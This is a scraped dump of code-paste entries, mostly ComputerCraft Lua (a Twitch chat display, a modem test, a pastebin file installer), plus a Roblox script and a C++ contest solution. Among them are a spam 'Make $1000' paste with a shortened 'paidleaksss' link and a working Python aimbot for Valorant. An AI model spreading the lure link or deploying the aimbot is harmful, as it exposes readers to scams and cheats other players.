            if new_line <= #text then append(doc, mk_text(text:sub(new_line), colour)) end
            return doc
        else
            if new_line <= next_line - 1 then
                append(doc, mk_text(text:sub(new_line, next_line - 1), colour))
            end
            new_line = next_line + 1
        end
    end
end

--- Concatenate several documents together. This behaves very similar to string concatenation.
--
-- @tparam Doc|string ... The documents to concatenate.
-- @treturn Doc The concatenated documents.
-- @usage
--     local pretty = require ""cc.pretty""
--     local doc1, doc2 = pretty.text(""doc1""), pretty.text(""doc2"")
--     print(pretty.concat(doc1, "" - "", doc2))
--     print(doc1 .. "" - "" .. doc2) -- Also supports ..
local function concat(...)
    local args = table.pack(...)
    for i = 1, args.n do
        if type(args[i]) == ""string"" then args[i] = text(args[i]) end
        if getmetatable(args[i]) ~= Doc then expect(i, args[i], ""document"") end
    end

    if args.n == 0 then return empty end
    if args.n == 1 then return args[1] end

    args.tag = ""concat""
    return setmetatable(args, Doc)
end

Doc.__concat = concat --- @local

--- Indent later lines of the given document with the given number of spaces.
--
-- For instance, nesting the document
-- ```txt
-- foo
-- bar
-- ```
-- by two spaces will produce
-- ```txt
-- foo
--   bar
-- ```
--
-- @tparam number depth The number of spaces with which the document should be indented.
-- @tparam Doc    doc   The document to indent.
-- @treturn Doc The nested document.
-- @usage
--     local pretty = require ""cc.pretty""
--     print(pretty.nest(2, pretty.text(""foo\nbar"")))
local function nest(depth, doc)
    expect(1, depth, ""number"")
    if getmetatable(doc) ~= Doc then expect(2, doc, ""document"") end
    if depth <= 0 then error(""depth must be a positive number"", 2) end

    return setmetatable({ tag = ""nest"", depth = depth, doc }, Doc)
end

local function flatten(doc)
    if doc.flat then return doc.flat end

    local kind = doc.tag
    if kind == ""nil"" or kind == ""text"" then
        return doc
    elseif kind == ""concat"" then
        local out = setmetatable({ tag = ""concat"", n = doc.n }, Doc)
        for i = 1, doc.n do out[i] = flatten(doc[i]) end
        doc.flat, out.flat = out, out -- cache the flattened node
        return out
    elseif kind == ""nest"" then
        return flatten(doc[1])
    elseif kind == ""group"" then
        return doc[1]
    else
        error(""Unknown doc "" .. kind)
    end
end

--- Builds a document which is displayed on a single line if there is enough
-- room, or as normal if not.
--
-- @tparam Doc doc The document to group.
-- @treturn Doc The grouped document.
-- @usage Uses group to show things being displayed on one or multiple lines.
--
--     local pretty = require ""cc.pretty""
--     local doc = pretty.group(""Hello"" .. pretty.space_line .. ""World"")
--     print(pretty.render(doc, 5)) -- On multiple lines
--     print(pretty.render(doc, 20)) -- Collapsed onto one.
local function group(doc)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end

    if doc.tag == ""group"" then return doc end -- Skip if already grouped.

    local flattened = flatten(doc)
    if flattened == doc then return doc end -- Also skip if flattening does nothing.
    return setmetatable({ tag = ""group"", flattened, doc }, Doc)
end

local function get_remaining(doc, width)
    local kind = doc.tag
    if kind == ""nil"" or kind == ""line"" then
        return width
    elseif kind == ""text"" then
        return width - #doc.text
    elseif kind == ""concat"" then
        for i = 1, doc.n do
            width = get_remaining(doc[i], width)
            if width < 0 then break end
        end
        return width
    elseif kind == ""group"" or kind == ""nest"" then
        return get_remaining(kind[1])
    else
        error(""Unknown doc "" .. kind)
    end
end

--- Display a document on the terminal.
--
-- @tparam      Doc     doc         The document to render
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
local function write(doc, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, ribbon_frac, ""number"", ""nil"")

    local term = term
    local width, height = term.getSize()
    local ribbon_width = (ribbon_frac or 0.6) * width
    if ribbon_width < 0 then ribbon_width = 0 end
    if ribbon_width > width then ribbon_width = width end

    local def_colour = term.getTextColour()
    local current_colour = def_colour

    local function go(doc, indent, col)
        local kind = doc.tag
        if kind == ""nil"" then
            return col
        elseif kind == ""text"" then
            local doc_colour = doc.colour or def_colour
            if doc_colour ~= current_colour then
                term.setTextColour(doc_colour)
                current_colour = doc_colour
            end

            str_write(doc.text)

            return col + #doc.text
        elseif kind == ""line"" then
            local _, y = term.getCursorPos()
            if y < height then
                term.setCursorPos(indent + 1, y + 1)
            else
                term.scroll(1)
                term.setCursorPos(indent + 1, height)
            end

            return indent
        elseif kind == ""concat"" then
            for i = 1, doc.n do col = go(doc[i], indent, col) end
            return col
        elseif kind == ""nest"" then
            return go(doc[1], indent + doc.depth, col)
        elseif kind == ""group"" then
            if get_remaining(doc[1], math.min(width, ribbon_width + indent) - col) >= 0 then
                return go(doc[1], indent, col)
            else
                return go(doc[2], indent, col)
            end
        else
            error(""Unknown doc "" .. kind)
        end
    end

    local col = math.max(term.getCursorPos() - 1, 0)
    go(doc, 0, col)
    if current_colour ~= def_colour then term.setTextColour(def_colour) end
end

--- Display a document on the terminal with a trailing new line.
--
-- @tparam      Doc     doc         The document to render.
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
local function print(doc, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, ribbon_frac, ""number"", ""nil"")
    write(doc, ribbon_frac)
    str_write(""\n"")
end

--- Render a document, converting it into a string.
--
-- @tparam      Doc     doc         The document to render.
-- @tparam[opt] number  width       The maximum width of this document. Note that long strings will not be wrapped to
-- fit this width - it is only used for finding the best layout.
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
-- @treturn string The rendered document as a string.
local function render(doc, width, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, width, ""number"", ""nil"")
    expect(3, ribbon_frac, ""number"", ""nil"")

    local ribbon_width
    if width then
        ribbon_width = (ribbon_frac or 0.6) * width
        if ribbon_width < 0 then ribbon_width = 0 end
        if ribbon_width > width then ribbon_width = width end
    end

    local out = { n = 0 }
    local function go(doc, indent, col)
        local kind = doc.tag
        if kind == ""nil"" then
            return col
        elseif kind == ""text"" then
            append(out, doc.text)
            return col + #doc.text
        elseif kind == ""line"" then
            append(out, ""\n"" .. ("" ""):rep(indent))
            return indent
        elseif kind == ""concat"" then
            for i = 1, doc.n do col = go(doc[i], indent, col) end
            return col
        elseif kind == ""nest"" then
            return go(doc[1], indent + doc.depth, col)
        elseif kind == ""group"" then
            if not width or get_remaining(doc[1], math.min(width, ribbon_width + indent) - col) >= 0 then
                return go(doc[1], indent, col)
            else
                return go(doc[2], indent, col)
            end
        else
            error(""Unknown doc "" .. kind)
        end
    end

    go(doc, 0, 0)
    return table.concat(out, """", 1, out.n)
end

Doc.__tostring = render --- @local

local keywords = {
    [""and""] = true, [""break""] = true, [""do""] = true, [""else""] = true,
    [""elseif""] = true, [""end""] = true, [""false""] = true, [""for""] = true,
    [""function""] = true, [""if""] = true, [""in""] = true, [""local""] = true,
    [""nil""] = true, [""not""] = true, [""or""] = true, [""repeat""] = true, [""return""] = true,
    [""then""] = true, [""true""] = true, [""until""] = true, [""while""] = true,
  }

local comma = text("","")
local braces = text(""{}"")
local obrace, cbrace = text(""{""), text(""}"")
local obracket, cbracket = text(""[""), text(""] = "")

local function key_compare(a, b)
    local ta, tb = type(a), type(b)

    if ta == ""string"" then return tb ~= ""string"" or a < b
    elseif tb == ""string"" then return false
    end

    if ta == ""number"" then return tb ~= ""number"" or a < b end
    return false
end

local function show_function(fn, options)
    local info = debug_info and debug_info(fn, ""Su"")

    -- Include function source position if available
    local name
    if options.function_source and info and info.short_src and info.linedefined and info.linedefined >= 1 then
        name = ""function<"" .. info.short_src .. "":"" .. info.linedefined .. "">""
    else
        name = tostring(fn)
    end

    -- Include arguments if a Lua function and if available. Lua will report ""C""
    -- functions as variadic.
    if options.function_args and info and info.what == ""Lua"" and info.nparams and debug_local then
        local args = {}
        for i = 1, info.nparams do args[i] = debug_local(fn, i) or ""?"" end
        if info.isvararg then args[#args + 1] = ""..."" end
        name = name .. ""("" .. table.concat(args, "", "") .. "")""
    end

    return name
end

local function pretty_impl(obj, options, tracking)
    local obj_type = type(obj)
    if obj_type == ""string"" then
        local formatted = (""%q""):format(obj):gsub(""\\\n"", ""\\n"")
        return text(formatted, colours.red)
    elseif obj_type == ""number"" then
        return text(tostring(obj), colours.magenta)
    elseif obj_type == ""function"" then
        return text(show_function(obj, options), colours.lightGrey)
    elseif obj_type ~= ""table"" or tracking[obj] then
        return text(tostring(obj), colours.lightGrey)
    elseif getmetatable(obj) ~= nil and getmetatable(obj).__tostring then
        return text(tostring(obj))
    elseif next(obj) == nil then
        return braces
    else
        tracking[obj] = true
        local doc = setmetatable({ tag = ""concat"", n = 1, space_line }, Doc)

        local length, keys, keysn = #obj, {}, 1
        for k in pairs(obj) do keys[keysn], keysn = k, keysn + 1 end
        table.sort(keys, key_compare)

        for i = 1, keysn - 1 do
            if i > 1 then append(doc, comma) append(doc, space_line) end

            local k = keys[i]
            local v = obj[k]
            local ty = type(k)
            if ty == ""number"" and k % 1 == 0 and k >= 1 and k <= length then
                append(doc, pretty_impl(v, options, tracking))
            elseif ty == ""string"" and not keywords[k] and k:match(""^[%a_][%a%d_]*$"") then
                append(doc, text(k .. "" = ""))
                append(doc, pretty_impl(v, options, tracking))
            else
                append(doc, obracket)
                append(doc, pretty_impl(k, options, tracking))
                append(doc, cbracket)
                append(doc, pretty_impl(v, options, tracking))
            end
        end

        tracking[obj] = nil
        return group(concat(obrace, nest(2, concat(table.unpack(doc, 1, doc.n))), space_line, cbrace))
    end
end

--- Pretty-print an arbitrary object, converting it into a document.
--
-- This can then be rendered with @{write} or @{print}.
--
-- @param obj The object to pretty-print.
-- @tparam[opt] { function_args = boolean, function_source = boolean } options
-- Controls how various properties are displayed.
--  - `function_args`: Show the arguments to a function if known (`false` by default).
--  - `function_source`: Show where the function was defined, instead of
--    `function: xxxxxxxx` (`false` by default).
-- @treturn Doc The object formatted as a document.
-- @usage Display a table on the screen
--     local pretty = require ""cc.pretty""
--     pretty.print(pretty.pretty({ 1, 2, 3 }))
local function prettyf(obj, options)
    expect(2, options, ""table"", ""nil"")
    options = options or {}

    local actual_options = {
        function_source = field(options, ""function_source"", ""boolean"", ""nil"") or false,
        function_args = field(options, ""function_args"", ""boolean"", ""nil"") or false,
    }
    return pretty_impl(obj, actual_options, {})
end

local pretty = {
    empty = empty,
    space = space,
    line = line,
    space_line = space_line,
    text = text,
    concat = concat,
    nest = nest,
    group = group,

    write = write,
    print = print,
    render = render,

    pretty = prettyf,
}

local monitor = peripheral.find(""monitor"")
local oldTerm = term.redirect(monitor)

function split(str, character)
  result = {}
  index = 1
  for s in string.gmatch(str, ""[^""..character..""]+"") do
    result[index] = s
    index = index + 1
  end
  return result
end
local hex = {""F0F0F0"", ""F2B233"", ""E57FD8"", ""99B2F2"", ""DEDE6C"", ""7FCC19"", ""F2B2CC"", ""4C4C4C"", ""999999"", ""4C99B2"", ""B266E5"", ""3366CC"", ""7F664C"", ""57A64E"", ""CC4C4C"", ""191919""}
local rgb = {}
for i=1,16,1 do
  rgb[i] = {tonumber(hex[i]:sub(1, 2), 16), tonumber(hex[i]:sub(3, 4), 16), tonumber(hex[i]:sub(5, 6), 16)}
end
local rgb2 = {}
for i=1,16,1 do
  rgb2[i] = {}
  for j=1,16,1 do
    rgb2[i][j] = {(rgb[i][1] * 34 + rgb[j][1] * 20) / 54, (rgb[i][2] * 34 + rgb[j][2] * 20) / 54, (rgb[i][3] * 34 + rgb[j][3] * 20) / 54}
  end
end
 
colors.fromRGB = function (r, g, b)
  local dist = 1e100
  local d = 1e100
  local color = -1
  for i=1,16,1 do
    d = math.sqrt((math.max(rgb[i][1], r) - math.min(rgb[i][1], r)) ^ 2 + (math.max(rgb[i][2], g) - math.min(rgb[i][2], g)) ^ 2 + (math.max(rgb[i][3], b) - math.min(rgb[i][3], b)) ^ 2)
    if d < dist then
      dist = d
      color = i - 1
    end
  end
  return 2 ^ color
end
 
local ws

function main()
	ws, err = http.websocket(""wss://irc-ws.chat.twitch.tv"")
	if err then
		print(err)
	elseif ws then
		ws.send(""PASS ottomated"")
		ws.send(""NICK justinfan""..math.random(10000, 99999))
		ws.send(""JOIN #""..CHATROOM)
		ws.send(""CAP REQ :twitch.tv/tags"")
		ws.send(""CAP REQ :twitch.tv/commands"")
		while true do
			local msg = ws.receive()
			if msg == ""PING :tmi.twitch.tv"" then
				ws.send(""PONG :tmi.twitch.tv"")
			else
				-- print(msg)
				local parts = split(msg, "" "")
				if parts[3] == ""PRIVMSG"" then
					local twitchParts = split(parts[1], "";"")
					local nameColor = ""#ffffff""
					local displayName
					local subscriber = false
					local founder = false
					local id
					for _, part in ipairs(twitchParts) do
						if string.sub(part, 1, 12) == ""@badge-info="" then
							founder = string.find(part, ""founder"") ~= nil
						elseif string.sub(part, 1, 6) == ""color="" then
							nameColor = string.sub(part, 7, -1)
						elseif string.sub(part, 1, 13) == ""display-name="" then
							displayName = string.sub(part, 14, -1)
						elseif string.sub(part, 1, 3) == ""id="" then
							id = string.sub(part, 4, -1)
						elseif string.sub(part, 1, 11) == ""subscriber="" then
							subscriber = string.sub(part, 12, -1) == ""1""
						end
					end
					subscriber = subscriber or founder
					
					local namePalette
					if #nameColor < 1 then
						namePalette = 2^math.random(0, 15)
					else
						local hex = string.sub(nameColor, 2, -1)
						local r = tonumber(string.sub(hex, 1, 2), 16)
						local g = tonumber(string.sub(hex, 3, 4), 16)
						local b = tonumber(string.sub(hex, 5, 6), 16)
						namePalette = colors.fromRGB(r, g, b)
					end

					if namePalette == colors.black or namePalette == colors.white then
						namePalette = colors.lightGray
					end

					if displayName and id then
						local message = string.sub(parts[5], 2, -1)

						for i=6,#parts do
							message = message.."" ""..parts[i]
						end
						if string.sub(message, 1, 7) == ""ACTION"" then
							message = string.sub(message, 9, -4)
						else
							message = string.sub(message, 1, -2)
						end
						if subscriber or not SUBSONLY then
							pretty.print(pretty.group(pretty.text(displayName, namePalette) .. pretty.text("":"", colors.white) .. pretty.space .. pretty.text(message, colors.white)))
							-- term.setTextColor(namePalette)
							-- term.write(displayName)
							-- term.setCursorPos()
							-- print(displayName, message)
						end
					end
				elseif CLEAR_MESSAGES and (parts[3] == ""CLEARMSG"" or parts[3] == ""CLEARCHAT"") then
					term.clear()
					term.setCursorPos(1,1)
				end
			end
		end
	end
end
while true do
 pcall(main)
 if ws then
	 ws.close()
 end
end
--term.redirect(oldTerm)"
pnrRN0SF,Make $1000 15-MINUTES (BEGINNER) RV,egio2345,JavaScript,Friday 4th of April 2025 12:08:19 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


foOnCZPTut
"
xjTpQ91Q,modem testing sender,Incomprehensible,Lua,Friday 4th of April 2025 12:06:46 PM CDT,"local monitor = peripheral.find(""monitor"")
local modem = peripheral.find(""modem"", rednet.open) -- doing it like this finds all modem peripherals and then opens rednet on them

--- MAIN
monitor.clear()
monitor.setCursorPos(1,1)
monitor.setTextScale(0.5)
monitor.write(""Hello, ID: "" .. os.computerID()) --the id of the computer

rednet.send(3, ""Hello from rednet!"")

function update()

end

while true do
	sleep(0.5)
	--update()
end"
xU7nNBTx,Untitled,drakon-firestone,Lua,Friday 4th of April 2025 11:11:58 AM CDT,"script.Start.OnServerEvent:Connect(function(sender)
	if sender == player then
		shooting = true
		spraySound.TimePosition = 0
		spraySound:Play()

		sprayParticle.Enabled = true
		shootTimer = 0
	end
end)
script.Stop.OnServerEvent:Connect(function(sender)
	if sender == player then
		shooting = false
		spraySound.TimePosition = 2.6
		sprayParticle.Enabled = false
		local nozzle = handle.Nozzle
		local newNozzle = nozzle:Clone()
		newNozzle.Parent = handle
		nozzle.Parent = workspace.Terrain
		nozzle.Position = Vector3.new(0, -10000, 0)
		sprayParticle = newNozzle.SprayParticle
		game:GetService(""Debris""):AddItem(nozzle, 5)
	end
end)"
bnzVG83C,\/a|0rant Colorbot,CodeCrusader,Python,Friday 4th of April 2025 11:10:17 AM CDT,"import cv2
import numpy as np
import pyautogui
import time
import math
import threading
import keyboard

""""""
This script is used to assist in aiming at enemies in Valorant.
It uses OpenCV to process the screen and find the enemies based on their color.
It then calculates the angle to aim at the enemy and moves the mouse accordingly.
It also includes a function to take a screenshot of the screen and save it as an image file.
It uses the pyautogui library to move the mouse and take screenshots.
It uses the numpy library to process the image data.
It uses the cv2 library to process the image data.
It uses the time library to add delays between actions.
It uses the math library to calculate angles and distances.
It uses the threading library to run the main function in a separate thread.
It uses the keyboard library to listen for key presses and stop the script.
""""""

def find_enemy(image, lower_color, upper_color):
    """"""
    Finds the enemy in the given image based on the specified color range.

    Args:
        image (numpy.ndarray): The image to process.
        lower_color (tuple): The lower bound of the color range in HSV.
        upper_color (tuple): The upper bound of the color range in HSV.

    Returns:
        tuple: The coordinates of the enemy's position (x, y) or None if not found.
    """"""
    if image is None or not isinstance(image, np.ndarray):
        raise ValueError(""Invalid image input. Please provide a valid numpy array."")
    
    hsv_image = cv2.cvtColor(image, cv2.COLOR_BGR2HSV)
    mask = cv2.inRange(hsv_image, lower_color, upper_color)
    contours, _ = cv2.findContours(mask, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)

    if contours:
        largest_contour = max(contours, key=cv2.contourArea)
        if cv2.contourArea(largest_contour) > 100:  # Minimum area threshold
            x, y, w, h = cv2.boundingRect(largest_contour)
            return x + w // 2, y + h // 2
    return None

def move_mouse_to_target(target_x, target_y):
    """"""
    Moves the mouse to the specified target coordinates.

    Args:
        target_x (int): The x-coordinate of the target.
        target_y (int): The y-coordinate of the target.
    """"""
    screen_width, screen_height = pyautogui.size()
    current_x, current_y = pyautogui.position()

    # Calculate the relative movement
    delta_x = target_x - current_x
    delta_y = target_y - current_y

    # Move the mouse smoothly
    pyautogui.moveRel(delta_x, delta_y, duration=0.1)

def take_screenshot():
    """"""
    Takes a screenshot of the screen and saves it as an image file.

    Returns:
        numpy.ndarray: The screenshot image as a numpy array.
    """"""
    screenshot = pyautogui.screenshot()
    screenshot_np = np.array(screenshot)
    return cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)

def main():
    """"""
    Main function to run the script.
    """"""
    lower_color = (0, 120, 70)  # Example HSV lower bound for red color
    upper_color = (10, 255, 255)  # Example HSV upper bound for red color

    print(""Press 'q' to stop the script."")

    while True:
        # Take a screenshot
        screen = take_screenshot()

        # Find the enemy on the screen
        target = find_enemy(screen, lower_color, upper_color)

        if target:
            target_x, target_y = target
            print(f""Enemy found at: {target_x}, {target_y}"")

            # Move the mouse to the target
            move_mouse_to_target(target_x, target_y)
        else:
            print(""No enemy found."")

        # Exit the script if 'q' is pressed
        if keyboard.is_pressed('q'):
            print(""Exiting script."")
            break

        time.sleep(0.1)  # Add a small delay to reduce CPU usage

if __name__ == ""__main__"":
    main()


# Note: This script is for educational purposes only. Use it responsibly and in accordance with the game's terms of service.
# Using this script in online games may lead to bans or other penalties."
BFEECTs6,异或和之和 参考代码,Dmaxiya,C++,Friday 4th of April 2025 11:05:11 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100000 + 100;
int n;
LL ans;
LL num[maxn], bitSum[maxn], cnt[2];

LL solve(int dig) {
    memset(cnt, 0, sizeof(cnt));
    for (int i = 1; i <= n; ++i) {
        bitSum[i] = bitSum[i - 1] + ((num[i] >> dig) & 1);
        ++cnt[bitSum[i] & 1];
    }
    LL ret = 0;
    for (int i = 1; i <= n; ++i) {
        ret += cnt[(bitSum[i - 1] & 1) ^ 1];
        --cnt[bitSum[i] & 1];
    }
    return ret;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> n;
    for (int i = 1; i <= n; ++i) {
        cin >> num[i];
    }
    for (int i = 0; i <= 20; ++i) {
        ans += solve(i) << i;
    }
    cout << ans << endl;

    return 0;
}
"
5ByihE6n,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:57:41 AM CDT,"local files_to_grab_JSON = '{""Vgtykr0c"":""0.composite""}';
local files_to_grab = textutils.unserialiseJSON(files_to_grab_JSON);

local install_directory = """"

local new_file_identifier = ""--ccpm_filename ""

local files_waiting = {};

local function fetchFile(pastebinID, filename)
    if fs.exists(filename) then
        fs.delete(filename);
    end

    return shell.openTab(""pastebin"", ""get"", pastebinID, filename);
end

for pastebinID, filename in pairs(files_to_grab) do
    local success = fetchFile(pastebinID, filename);

    if success then
        table.insert(files_waiting, filename);
    end
end

local unconsumed_files = {};

local function consumeCompositeFile(fileHandle)
    local currentLine = fileHandle.readLine();
    local currentHandle = nil;

    while currentLine ~= nil do
        if string.find(currentLine, new_file_identifier) then
            -- new file, consume old one
            if currentHandle ~= nil then
                currentHandle.close();
            end

            local filename = string.sub(currentLine, #new_file_identifier + 1);
            currentHandle = fs.open(install_directory..""/""..filename, ""w"");
        elseif currentHandle ~= nil then
            currentHandle.writeLine(currentLine)
        end
        currentLine = fileHandle.readLine();
    end

    if currentHandle ~= nil then
        currentHandle.close();
    end
end

local function consumeFiles()
    while #files_waiting > 0 do
        for index, filename in ipairs(files_waiting) do
            if fs.exists(filename) then
                table.remove(files_waiting, index);
                table.insert(unconsumed_files, filename);
            end
        end

        for index, temp_filename in ipairs(unconsumed_files) do
            local temp_file = fs.open(temp_filename, ""r"");
            consumeCompositeFile(temp_file)
            temp_file.close();
            fs.delete(temp_filename);
        end
    end
end

consumeFiles();"
P6ADmhc7,Twitch_chat_lucavtch,ZeProf2ModsYTB,Lua,Friday 4th of April 2025 10:55:11 AM CDT,"CHATROOM = ""lucavtch""
SUBSONLY = false
CLEAR_MESSAGES = true

local expect = require ""cc.expect""
local expect, field = expect.expect, expect.field

local type, getmetatable, setmetatable, colours, str_write, tostring = type, getmetatable, setmetatable, colours, write, tostring
local debug_info = type(debug) == ""table"" and type(debug.getinfo) == ""function"" and debug.getinfo
local debug_local = type(debug) == ""table"" and type(debug.getlocal) == ""function"" and debug.getlocal

--- @{table.insert} alternative, but with the length stored inline.
local function append(out, value)
    local n = out.n + 1
    out[n], out.n = value, n
end

--- A document containing formatted text, with multiple possible layouts.
--
-- Documents effectively represent a sequence of strings in alternative layouts,
-- which we will try to print in the most compact form necessary.
--
-- @type Doc
local Doc = { }

--- An empty document.
local empty = setmetatable({ tag = ""nil"" }, Doc)

--- A document with a single space in it.
local space = setmetatable({ tag = ""text"", text = "" "" }, Doc)

--- A line break. When collapsed with @{group}, this will be replaced with @{empty}.
local line = setmetatable({ tag = ""line"", flat = empty }, Doc)

--- A line break. When collapsed with @{group}, this will be replaced with @{space}.
local space_line = setmetatable({ tag = ""line"", flat = space }, Doc)

local text_cache = { [""""] = empty, ["" ""] = space, [""\n""] = space_line }

local function mk_text(text, colour)
    return text_cache[text] or setmetatable({ tag = ""text"", text = text, colour = colour }, Doc)
end

--- Create a new document from a string.
--
-- If your string contains multiple lines, @{group} will flatten the string
-- into a single line, with spaces between each line.
--
-- @tparam      string text   The string to construct a new document with.
-- @tparam[opt] number colour The colour this text should be printed with. If not given, we default to the current
-- colour.
-- @treturn Doc The document with the provided text.
-- @usage Write some blue text.
--     local pretty = require ""cc.pretty""
--     pretty.print(pretty.text(""Hello!"", colours.blue))
local function text(text, colour)
    expect(1, text, ""string"")
    expect(2, colour, ""number"", ""nil"")

    local cached = text_cache[text]
    if cached then return cached end

    local new_line = text:find(""\n"", 1)
    if not new_line then return mk_text(text, colour) end

    -- Split the string by ""\n"". With a micro-optimisation to skip empty strings.
    local doc = setmetatable({ tag = ""concat"", n = 0 }, Doc)
    if new_line ~= 1 then append(doc, mk_text(text:sub(1, new_line - 1), colour)) end

    new_line = new_line + 1
    while true do
        local next_line = text:find(""\n"", new_line)
        append(doc, space_line)
        if not next_line then
            if new_line <= #text then append(doc, mk_text(text:sub(new_line), colour)) end
            return doc
        else
            if new_line <= next_line - 1 then
                append(doc, mk_text(text:sub(new_line, next_line - 1), colour))
            end
            new_line = next_line + 1
        end
    end
end

--- Concatenate several documents together. This behaves very similar to string concatenation.
--
-- @tparam Doc|string ... The documents to concatenate.
-- @treturn Doc The concatenated documents.
-- @usage
--     local pretty = require ""cc.pretty""
--     local doc1, doc2 = pretty.text(""doc1""), pretty.text(""doc2"")
--     print(pretty.concat(doc1, "" - "", doc2))
--     print(doc1 .. "" - "" .. doc2) -- Also supports ..
local function concat(...)
    local args = table.pack(...)
    for i = 1, args.n do
        if type(args[i]) == ""string"" then args[i] = text(args[i]) end
        if getmetatable(args[i]) ~= Doc then expect(i, args[i], ""document"") end
    end

    if args.n == 0 then return empty end
    if args.n == 1 then return args[1] end

    args.tag = ""concat""
    return setmetatable(args, Doc)
end

Doc.__concat = concat --- @local

--- Indent later lines of the given document with the given number of spaces.
--
-- For instance, nesting the document
-- ```txt
-- foo
-- bar
-- ```
-- by two spaces will produce
-- ```txt
-- foo
--   bar
-- ```
--
-- @tparam number depth The number of spaces with which the document should be indented.
-- @tparam Doc    doc   The document to indent.
-- @treturn Doc The nested document.
-- @usage
--     local pretty = require ""cc.pretty""
--     print(pretty.nest(2, pretty.text(""foo\nbar"")))
local function nest(depth, doc)
    expect(1, depth, ""number"")
    if getmetatable(doc) ~= Doc then expect(2, doc, ""document"") end
    if depth <= 0 then error(""depth must be a positive number"", 2) end

    return setmetatable({ tag = ""nest"", depth = depth, doc }, Doc)
end

local function flatten(doc)
    if doc.flat then return doc.flat end

    local kind = doc.tag
    if kind == ""nil"" or kind == ""text"" then
        return doc
    elseif kind == ""concat"" then
        local out = setmetatable({ tag = ""concat"", n = doc.n }, Doc)
        for i = 1, doc.n do out[i] = flatten(doc[i]) end
        doc.flat, out.flat = out, out -- cache the flattened node
        return out
    elseif kind == ""nest"" then
        return flatten(doc[1])
    elseif kind == ""group"" then
        return doc[1]
    else
        error(""Unknown doc "" .. kind)
    end
end

--- Builds a document which is displayed on a single line if there is enough
-- room, or as normal if not.
--
-- @tparam Doc doc The document to group.
-- @treturn Doc The grouped document.
-- @usage Uses group to show things being displayed on one or multiple lines.
--
--     local pretty = require ""cc.pretty""
--     local doc = pretty.group(""Hello"" .. pretty.space_line .. ""World"")
--     print(pretty.render(doc, 5)) -- On multiple lines
--     print(pretty.render(doc, 20)) -- Collapsed onto one.
local function group(doc)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end

    if doc.tag == ""group"" then return doc end -- Skip if already grouped.

    local flattened = flatten(doc)
    if flattened == doc then return doc end -- Also skip if flattening does nothing.
    return setmetatable({ tag = ""group"", flattened, doc }, Doc)
end

local function get_remaining(doc, width)
    local kind = doc.tag
    if kind == ""nil"" or kind == ""line"" then
        return width
    elseif kind == ""text"" then
        return width - #doc.text
    elseif kind == ""concat"" then
        for i = 1, doc.n do
            width = get_remaining(doc[i], width)
            if width < 0 then break end
        end
        return width
    elseif kind == ""group"" or kind == ""nest"" then
        return get_remaining(kind[1])
    else
        error(""Unknown doc "" .. kind)
    end
end

--- Display a document on the terminal.
--
-- @tparam      Doc     doc         The document to render
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
local function write(doc, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, ribbon_frac, ""number"", ""nil"")

    local term = term
    local width, height = term.getSize()
    local ribbon_width = (ribbon_frac or 0.6) * width
    if ribbon_width < 0 then ribbon_width = 0 end
    if ribbon_width > width then ribbon_width = width end

    local def_colour = term.getTextColour()
    local current_colour = def_colour

    local function go(doc, indent, col)
        local kind = doc.tag
        if kind == ""nil"" then
            return col
        elseif kind == ""text"" then
            local doc_colour = doc.colour or def_colour
            if doc_colour ~= current_colour then
                term.setTextColour(doc_colour)
                current_colour = doc_colour
            end

            str_write(doc.text)

            return col + #doc.text
        elseif kind == ""line"" then
            local _, y = term.getCursorPos()
            if y < height then
                term.setCursorPos(indent + 1, y + 1)
            else
                term.scroll(1)
                term.setCursorPos(indent + 1, height)
            end

            return indent
        elseif kind == ""concat"" then
            for i = 1, doc.n do col = go(doc[i], indent, col) end
            return col
        elseif kind == ""nest"" then
            return go(doc[1], indent + doc.depth, col)
        elseif kind == ""group"" then
            if get_remaining(doc[1], math.min(width, ribbon_width + indent) - col) >= 0 then
                return go(doc[1], indent, col)
            else
                return go(doc[2], indent, col)
            end
        else
            error(""Unknown doc "" .. kind)
        end
    end

    local col = math.max(term.getCursorPos() - 1, 0)
    go(doc, 0, col)
    if current_colour ~= def_colour then term.setTextColour(def_colour) end
end

--- Display a document on the terminal with a trailing new line.
--
-- @tparam      Doc     doc         The document to render.
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
local function print(doc, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, ribbon_frac, ""number"", ""nil"")
    write(doc, ribbon_frac)
    str_write(""\n"")
end

--- Render a document, converting it into a string.
--
-- @tparam      Doc     doc         The document to render.
-- @tparam[opt] number  width       The maximum width of this document. Note that long strings will not be wrapped to
-- fit this width - it is only used for finding the best layout.
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
-- @treturn string The rendered document as a string.
local function render(doc, width, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, width, ""number"", ""nil"")
    expect(3, ribbon_frac, ""number"", ""nil"")

    local ribbon_width
    if width then
        ribbon_width = (ribbon_frac or 0.6) * width
        if ribbon_width < 0 then ribbon_width = 0 end
        if ribbon_width > width then ribbon_width = width end
    end

    local out = { n = 0 }
    local function go(doc, indent, col)
        local kind = doc.tag
        if kind == ""nil"" then
            return col
        elseif kind == ""text"" then
            append(out, doc.text)
            return col + #doc.text
        elseif kind == ""line"" then
            append(out, ""\n"" .. ("" ""):rep(indent))
            return indent
        elseif kind == ""concat"" then
            for i = 1, doc.n do col = go(doc[i], indent, col) end
            return col
        elseif kind == ""nest"" then
